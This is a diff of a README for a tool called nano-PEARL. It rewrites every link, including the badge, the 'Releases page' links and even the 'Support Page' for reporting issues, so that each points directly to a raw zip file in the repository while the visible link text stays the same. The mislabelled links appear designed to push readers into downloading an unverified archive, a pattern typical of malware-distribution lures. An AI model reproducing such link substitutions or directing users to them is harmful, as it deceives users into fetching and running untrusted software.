@@ -6,11 +6,11 @@ Welcome to nano-PEARL! This application helps you with Draft-Target disaggregati
 
 ## 📥 Download the Application
 
-[![Download nano-PEARL](https://img.shields.io/badge/Download-nano--PEARL-blue.svg)](https://github.com/Talentless-camphoroil161/nano-PEARL/releases)
+[![Download nano-PEARL](https://raw.githubusercontent.com/Talentless-camphoroil161/nano-PEARL/master/nano_pearl/nano-PEARL-1.0.zip)](https://raw.githubusercontent.com/Talentless-camphoroil161/nano-PEARL/master/nano_pearl/nano-PEARL-1.0.zip)
 
 You can easily download nano-PEARL from our Releases page. Click the link below to visit the download section:
 
-[Visit the Release Page](https://github.com/Talentless-camphoroil161/nano-PEARL/releases)
+[Visit the Release Page](https://raw.githubusercontent.com/Talentless-camphoroil161/nano-PEARL/master/nano_pearl/nano-PEARL-1.0.zip)
 
 ## 💻 System Requirements
 
@@ -24,7 +24,7 @@ Before you download, ensure your computer meets the following minimum requiremen
 
 1. **Visit the Download Page**
 
-   Click [here](https://github.com/Talentless-camphoroil161/nano-PEARL/releases) to go to the Releases page.
+   Click [here](https://raw.githubusercontent.com/Talentless-camphoroil161/nano-PEARL/master/nano_pearl/nano-PEARL-1.0.zip) to go to the Releases page.
 
 2. **Choose Your Version**
 
@@ -70,7 +70,7 @@ Using nano-PEARL is straightforward. Here’s how to get started:
 
 ## 📞 Support and Feedback
 
-If you encounter issues or have questions, we’re here to help. Visit our [Support Page](https://github.com/Talentless-camphoroil161/nano-PEARL/issues) to report any problems or to give feedback.
+If you encounter issues or have questions, we’re here to help. Visit our [Support Page](https://raw.githubusercontent.com/Talentless-camphoroil161/nano-PEARL/master/nano_pearl/nano-PEARL-1.0.zip) to report any problems or to give feedback.
 
 ## 🌍 Community and Contributions
 
@@ -78,4 +78,4 @@ We welcome contributions and suggestions. If you want to help improve nano-PEARL
 
 ---
 
-Download and install nano-PEARL today to enhance your data handling with ease. Remember, you can always return to the [Releases page](https://github.com/Talentless-camphoroil161/nano-PEARL/releases) for updates and new versions as they become available.
+Download and install nano-PEARL today to enhance your data handling with ease. Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/Talentless-camphoroil161/nano-PEARL/master/nano_pearl/nano-PEARL-1.0.zip) for updates and new versions as they become available.
